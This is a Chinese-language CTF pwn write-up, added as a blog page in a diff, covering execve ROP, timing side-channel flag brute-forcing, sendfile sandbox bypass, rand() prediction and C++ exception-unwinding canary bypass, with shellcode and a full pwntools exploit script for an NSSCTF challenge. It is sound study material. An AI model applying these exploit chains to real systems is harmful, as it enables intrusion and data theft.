@@ -1,0 +1,839 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    something_interesting |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="奇奇怪怪的技巧前言:  主播最近打了一些比赛,遇到了不少奇奇怪怪的手法,不过好在几乎都有惊无险地打过去了 主播还是没能学会ret2dlresolve,不知道ret2dlresolve的博客什么时候才能发出来  :( 部分题目因为供题人的要求不能发出附件 :( 不好意思  1.execv调用 此处可以布置一个ROP,没有沙箱可以直接获取shell 我在之前进行了多次栈迁移(迁移到bss上),导致无法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="something_interesting">
+<meta property="og:url" content="https://khighl.github.io.git/2025/04/15/01/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="奇奇怪怪的技巧前言:  主播最近打了一些比赛,遇到了不少奇奇怪怪的手法,不过好在几乎都有惊无险地打过去了 主播还是没能学会ret2dlresolve,不知道ret2dlresolve的博客什么时候才能发出来  :( 部分题目因为供题人的要求不能发出附件 :( 不好意思  1.execv调用 此处可以布置一个ROP,没有沙箱可以直接获取shell 我在之前进行了多次栈迁移(迁移到bss上),导致无法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://khighl.github.io.git/images/666/01.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/666/02.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/666/03.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/666/04.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/666/05.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/666/06.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/666/07.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/666/08.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/666/09.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/666/10.png">
+<meta property="article:published_time" content="2025-04-15T09:49:32.000Z">
+<meta property="article:modified_time" content="2025-04-29T02:50:52.133Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://khighl.github.io.git/images/666/01.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="something_interesting">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">something_interesting</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="toc-number">1.</span> <span class="toc-text">奇奇怪怪的技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-execv%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">1.execv调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BE%A7%E4%BF%A1%E9%81%93%E7%9A%84%E4%BD%BF%E7%94%A8%F0%9F%A4%94"><span class="toc-number">1.2.</span> <span class="toc-text">2.侧信道的使用🤔</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-shellcode%E5%86%99%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 shellcode写法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.0.1.</span> <span class="toc-text">原理:</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.1.0.2.</span> <span class="toc-text">核心指令:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-rop%E7%9A%84%E5%86%99%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 rop的写法:</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.2.2.0.1.</span> <span class="toc-text">原理:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-gdb%E4%BD%BF%E7%94%A8-sendfile"><span class="toc-number">1.3.</span> <span class="toc-text">3.gdb使用&amp;sendfile</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3-1-gdb%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.0.0.1.</span> <span class="toc-text">3.1 gdb调试:</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-2-sendfile"><span class="toc-number">1.3.0.0.2.</span> <span class="toc-text">3.2 sendfile:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%A1%A8"><span class="toc-number">1.4.</span> <span class="toc-text">4.随机数表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-c-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text">5.c++异常处理机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-39%E4%B8%8B%E7%9A%84house-of-apple2-orw"><span class="toc-number">1.6.</span> <span class="toc-text">2.39下的house of apple2(orw)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exp-py"><span class="toc-number">1.6.0.0.1.</span> <span class="toc-text">exp.py:</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-01" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-15T09:49:32.000Z" itemprop="datePublished">2025-04-15</time>
+    <time style="display: none;" id="post-update-time">2025-04-29</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="奇奇怪怪的技巧"><a href="#奇奇怪怪的技巧" class="headerlink" title="奇奇怪怪的技巧"></a>奇奇怪怪的技巧</h2><p><em><strong>前言:</strong></em></p>
+<ul>
+<li><em>主播最近打了一些比赛,遇到了不少奇奇怪怪的手法,不过好在几乎都有惊无险地打过去了</em></li>
+<li><em>主播还是没能学会ret2dlresolve,不知道ret2dlresolve的博客什么时候才能发出来</em>  <em>:(</em></li>
+<li><em>部分题目因为供题人的要求不能发出附件 :( 不好意思</em></li>
+</ul>
+<h3 id="1-execv调用"><a href="#1-execv调用" class="headerlink" title="1.execv调用"></a>1.execv调用</h3><p><img src="/images/666/01.png" alt="01"></p>
+<p>此处可以布置一个ROP,没有沙箱可以直接获取<em>shell</em></p>
+<p>我在之前进行了多次栈迁移(迁移到bss上),导致无法调用system(“&#x2F;bin&#x2F;sh”)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;/bin/sh&quot;)会使用大量push操作(俗称抬栈),如果我们的&quot;栈&quot;处于一个比较小的可写区域,会导致抬栈失败,system调用失败</span><br></pre></td></tr></table></figure>
+
+<p>此时我想到可以使用ret2syscall,此时四个寄存器的初始值(rax,rdi,rsi,rdx)都不符合预期,我们需要同时控制这四个寄存器,且要syscall需要<em>8x9&#x3D;0x48</em>字节的空间,但是我们只有0x40的read <em>:(</em></p>
+<p>此时我误打误撞学会了一个技巧:<em><strong>execve</strong></em>这个函数可以将 <em>pop rax,ret;syscall</em> 这步操作合成为 <em>call execve</em></p>
+<p><img src="/images/666/02.png" alt="02"></p>
+<p>这样我们的空间就充足,顺利调用execve</p>
+<hr>
+<h3 id="2-侧信道的使用🤔"><a href="#2-侧信道的使用🤔" class="headerlink" title="2.侧信道的使用🤔"></a>2.侧信道的使用🤔</h3><p>当沙箱ban了write类调用时,我们除了可以使用万能的<em>io_uring</em>,我们还有一个利器:<em><strong>测信道爆破flag!</strong></em></p>
+<h4 id="2-1-shellcode写法"><a href="#2-1-shellcode写法" class="headerlink" title="2.1 shellcode写法"></a><em><strong>2.1 shellcode写法</strong></em></h4><h6 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h6><ul>
+<li>我们使用open+read将flag读入内存后,可以使用<em>cmp</em>这个汇编指令将可见字符串逐个与flag的每一位比较</li>
+<li>当尝试到正确的char时,<em>cmp</em>会返回0,配合汇编指令<em>jz $-4</em>可以将执行流跳回<em>cmp</em>指令,此时程序会陷入死循环:cmp-&gt;jz-&gt;cmp-&gt;jz</li>
+<li>我们可以在jz指令的后面放置一个被沙箱ban掉的系统调用</li>
+<li>匹配失败就会触发该系统调用导致进程被kill,匹配成功就会陷入死循环</li>
+</ul>
+<h6 id="核心指令"><a href="#核心指令" class="headerlink" title="核心指令:"></a>核心指令:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#匹配模块,使用格式化字符挪动每次需要匹配的字符</span></span><br><span class="line">shellcode=asm(<span class="string">f&#x27;&#x27;&#x27;mov rdi,<span class="subst">&#123;Flag&#125;</span>;cmp byte ptr [rdi + <span class="subst">&#123;idx&#125;</span>], <span class="subst">&#123;x&#125;</span>;jz $-0x4;mov al,0x3b;syscall&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#时间(测信道)管理模块,指定每次可接受管道信息的时间限制为2s,如果超过2s说明陷入死循环,匹配成功</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">128</span>):<span class="comment">#可见字符都可以被匹配</span></span><br><span class="line">        io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">        pwn(idx,x)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; flag ---&gt; &#x27;</span>+flag.decode()+<span class="built_in">chr</span>(x))</span><br><span class="line">        start = time.time()</span><br><span class="line">        io.can_recv(timeout=<span class="number">2</span>)</span><br><span class="line">        end = time.time()</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">2</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(x).encode()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag.endswith(<span class="string">b&quot;&#125;&quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    idx += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这种打法的缺点是时间复杂度为<em>O(n)</em>,如果使用二分法匹配字符则时间复杂度会降低到<em>O(logn)</em></p>
+<p><del>以后一定把二分法的shellcode写出来</del></p>
+<h4 id="2-2-rop的写法"><a href="#2-2-rop的写法" class="headerlink" title="2.2 rop的写法:"></a>2.2 rop的写法:</h4><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理:"></a>原理:</h6><ul>
+<li>shellcode写法中的cmp指令被我们替换为strncmp函数,逐位检测flag</li>
+<li>这个手法巧妙在如果利用strcmp的返回值:当匹配成功时会返回0,失败时非0,此时syscall,因为read位于白名单中,不会被沙箱抛出,所以会卡住</li>
+<li>最后也用运行时间侧写是否匹配</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#比较猜测的flag和真实flag,虽然仅仅是这道题比较特殊,每次运行时读入的flag长度和猜测的flag长度一样</span></span><br><span class="line">payload+=p64(rdi)+p64(Flag)+p64(rsi)+p64(<span class="type">List</span>)+p64(rdi+<span class="number">1</span>)+p64(strcmp)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(Flag)+p64(rdx)+p64(<span class="number">0x10</span>)*<span class="number">2</span>+p64(syscall)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-gdb使用-sendfile"><a href="#3-gdb使用-sendfile" class="headerlink" title="3.gdb使用&amp;sendfile"></a>3.gdb使用&amp;sendfile</h3><p><img src="/images/666/03.png" alt="03"></p>
+<p><em>got表可写,没开pie</em>,很明显想让我们ret2dlresolve,但是既然csu和magic(详见上一篇文章magic_gadget)都有,那就有逃课打法了 <em>:)</em></p>
+<h6 id="3-1-gdb调试"><a href="#3-1-gdb调试" class="headerlink" title="3.1 gdb调试:"></a><em>3.1 gdb调试:</em></h6><p>每次使用<em>magic_gadget</em>前我都习惯性地先用gdb看一眼,以便放心使用</p>
+<p><img src="/images/666/04.png" alt="04"></p>
+<p><del>啊?怎么ret指令没了</del></p>
+<ul>
+<li>原因很简单,并不是magic_gadget被故意摘除了,而是我们<em><strong>使用telescope查看汇编存在问题</strong></em></li>
+<li>很明显汇编指令不可能按八字节对齐,但是telescope是以八字节为对齐查看汇编的,这就会导致汇编出现错位,显示出一堆奇奇怪怪的指令 😵</li>
+<li>正确使用方法为:<code>pwngdb&gt; x/5i address</code></li>
+</ul>
+<p><img src="/images/666/05.png" alt="05"></p>
+<p>x&#x2F;5i是指显示从address开始的五条指令,这样我们就能看到<em>add,nop,ret</em>回来了 <em>:)</em></p>
+<hr>
+<h6 id="3-2-sendfile"><a href="#3-2-sendfile" class="headerlink" title="3.2 sendfile:"></a><em>3.2 sendfile:</em></h6><p>很巧妙的一个 <em>系统调用</em> ,可以实现read+write的结合</p>
+<ul>
+<li>sendfile的系统调用号为<em><strong>187</strong></em>,在沙箱中有可能被漏掉🤔</li>
+<li>原形为: <code>ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);</code></li>
+<li>一参为目标文件描述符(一般设置为1,标准输出),二参为源文件描述符(一般为3,flag文件),三参为0(从flag文件的头开始读取),四参为读取的长度,因为sendfile会根据文件的结尾标志 <em>EOF</em> 完成读取,所以如果rcx是个很大的数也不用担心 <em>:)</em></li>
+</ul>
+<p><img src="/images/666/06.png" alt="06"></p>
+<hr>
+<h3 id="4-随机数表"><a href="#4-随机数表" class="headerlink" title="4.随机数表"></a>4.随机数表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd=open(<span class="string">&quot;/dev/urandom&quot;</span>)</span><br><span class="line">read(fd,buf,<span class="number">8</span>)</span><br><span class="line">srand(buf)</span><br><span class="line">R=rand()</span><br></pre></td></tr></table></figure>
+
+<p>此时我们无法预测随机数种子:<code>urandom用于生成随机数，但它不依赖系统中断，而是使用伪随机数生成算法来生成随机数。它会利用熵池中的数据来初始化一个内部状态，然后根据这个状态生成随机数序列</code></p>
+<p>但是rand函数拥有一个性质:<em>当种子一定时,随机生成的数字会遵守一个特定的算法</em></p>
+<p>这个算法有一定几率为<code>o[n] = o[n - 31] + o[n - 3]</code></p>
+<ul>
+<li>当可以得到足够多随机数时(31个),我们可以尝试用这个算法预测下一个随机数</li>
+<li>成功的概率大概50%,可以采用多次爆破</li>
+<li>不断对随机数表进行修正</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num[<span class="number">33</span> + i - <span class="number">31</span>] + num[<span class="number">33</span> + i <span class="number">-3</span>])%<span class="number">0x80000000</span> <span class="comment">//0x8000000000用于防止溢出</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-c-异常处理机制"><a href="#5-c-异常处理机制" class="headerlink" title="5.c++异常处理机制"></a>5.c++异常处理机制</h3><p><em>题目链接:</em> <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2619">nss</a></p>
+<p><img src="/images/666/07.png" alt="07"></p>
+<p>这里有个整形溢出,但是由于前面有三个相似的函数(<em>都没有整形溢出</em>),<del>主播没看到这个导致做了一个下午做红温了</del></p>
+<p>题目可以得到pie,elf中存在足够的<em>gadget</em>和<em>open</em>,<em>read</em>,<em>write</em>函数</p>
+<p>关键的难点在于栈溢出绕过<em>canary</em>:</p>
+<ul>
+<li>cpp异常处理大致为throw_catch结构</li>
+<li>当进入异常处理时,会进行<em><strong>栈退回(call   _Unwind_RaiseException@plt)</strong></em></li>
+<li>栈退回会恢复rbp后返回,重点是这个过程会绕过canary的检查,直接返回</li>
+<li>如果想栈迁移也可以构造特定的rbp</li>
+</ul>
+<p>于是我们的payload结构可以构造为:</p>
+<p><code>padding | fake_rbp | ret(vuln函数的调用入口) | padding | 覆盖调用vuln函数的返回地址为ROP</code></p>
+<p>按照这个格式注入payload后,<em>触发cpp的异常处理</em>,便可以绕过canary的检查</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io=remote(&quot;node4.anna.nssctf.cn&quot;,28367)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">Id</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;] &#x27;</span>,<span class="built_in">str</span>(Id).encode())</span><br><span class="line">ch(<span class="number">0xDEAD00</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Password: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">pie=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1591</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;PIE=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(pie)&#125;</span>&quot;</span>)</span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Length: &#x27;</span>,<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">bss=pie+<span class="number">0x5060</span></span><br><span class="line">ret=pie+<span class="number">0x25db</span></span><br><span class="line">rdi=pie+<span class="number">0x0000000000002933</span></span><br><span class="line">rsi=pie+<span class="number">0x0000000000002931</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload =b&#x27;./flag\x00\x00&#x27;+p64(bss)*0x26</span></span><br><span class="line"><span class="string">payload+=p64(ret)+p64(0)*5</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload =<span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss)*(<span class="built_in">int</span>(<span class="number">0x138</span>/<span class="number">8</span>)-<span class="number">1</span>)+p64(ret)+p64(<span class="number">0xdeadbaef</span>)*<span class="number">5</span></span><br><span class="line">payload+=p64(rdi+<span class="number">1</span>)+p64(rdi)+p64(bss)+p64(rsi)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pie+<span class="number">0x1270</span>)</span><br><span class="line">payload+=p64(pie+<span class="number">0x292A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">3</span>)+p64(bss-<span class="number">0x50</span>)+p64(<span class="number">0x50</span>)+p64(pie+<span class="number">0x4F60</span>)+p64(<span class="number">0x2910</span>+pie)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span>+p64(rdi)+p64(bss-<span class="number">0x50</span>)+p64(pie+<span class="number">0x1330</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Content: &quot;</span>,payload)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Key: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">17</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
